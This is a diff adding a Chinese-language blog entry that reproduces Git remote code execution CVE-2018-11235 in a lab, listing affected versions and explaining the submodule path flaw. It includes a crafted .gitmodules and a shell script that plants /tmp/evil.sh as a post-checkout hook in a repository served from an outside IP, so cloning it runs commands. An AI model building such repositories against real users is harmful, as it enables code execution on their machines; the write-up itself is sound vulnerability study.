@@ -4,6 +4,19 @@
   
     
     <entry>
+      <title>Git远程代码执行漏洞(CVE-2018-11235)</title>
+      <link href="/2020/12/08/git-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2018-11235/"/>
+      <url>/2020/12/08/git-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2018-11235/</url>
+      
+        <content type="html"><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Git version &lt; 2.13.7<br>Git version 2.14.x &lt; 2.14.4<br>Git version 2.15.x &lt; 2.15.2<br>Git version 2.16.x &lt; 2.16.4<br>Git version 2.17.x &lt; 2.17.1</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><ol><li><p>部署攻击方的测试镜像：<code>docker run -d -p 10002:80 medicean/vulapps:g_git_1_exp</code></p></li><li><p>访问<a href="http://118.202.10.43:9000/" target="_blank" rel="noopener">http://118.202.10.43:9000/</a> 生成可实施攻击的仓库<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/12/d2df70ae38c18d94.png" alt=""></p></li><li><p>在本地使用git clone –recursive  <code>http://118.202.10.43:9000/git/tsQDRioJlF</code>即可触发命令执行<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://image.iwonder.run/imgs/2020/12/d53dabb32e4fb8c3.png" alt=""></p></li></ol><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ol><li><p>.gitmodules文件文件中的[submodule]选项的子模块名称存在目录的问题，导致子模块可以在主仓库中被创建（正常情况应为$GIT_DIR/modules/中创建）</p></li><li><p>Git hook是Git工作过程中发生预定义事件时触发的脚本，客户端Git hook是存在本地的，因此若要借此执行恶意脚本需要创建$Git_DIR之外的钩子</p></li><li><p>利用第一点的路径问题，可以将子模块（../../fake/moudles/evil）创建至仓库主目录下，当执行git submoudle update –init时，由于当前路径有正确的子模块，因此会将fake/modules/evil作为路径而非$GIT_DIR/modules/evil</p></li><li><p>构建的.gitmodules形如：</p><pre><code>[submodule "../../modules/evil"]path = evilurl = http://118.202.10.43:9000/git/base.gitupdate = checkout[submodule "base"]path = baseurl = http://118.202.10.43:9000/git/base.git</code></pre></li></ol><h3 id="生成exp的代码"><a href="#生成exp的代码" class="headerlink" title="生成exp的代码"></a>生成exp的代码</h3><p>通过下面代码生成的仓库（hack.git），在其他主机执行git clone –recursive  <code>http://[ip]/hack.git</code>时，即可能触发CVE-2018-11235</p><pre><code>git submodule add http://118.202.10.43:9000/git/base.git evilmkdir modulescp -r .git/modules/evil moduleschmod +x /tmp/evil.sh # 这里是要执行的命令cp /tmp/evil.sh modules/evil/hooks/post-checkoutgit config -f .gitmodules submodule.evil.update checkoutgit config -f .gitmodules --rename-section submodule.evil submodule.../../modules/evilgit add modulesgit submodule add "$repo_submodule"git add base</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://atorralba.github.io/CVE-2018-11235/" target="_blank" rel="noopener">https://atorralba.github.io/CVE-2018-11235/</a><br><a href="https://www.anquanke.com/post/id/146909#h3-8" target="_blank" rel="noopener">https://www.anquanke.com/post/id/146909#h3-8</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>FFmpeg 文件读取漏洞(CVE-2017-9993)</title>
       <link href="/2020/12/08/ffmpeg-3.x.x-wen-jian-du-qu-lou-dong/"/>
       <url>/2020/12/08/ffmpeg-3.x.x-wen-jian-du-qu-lou-dong/</url>
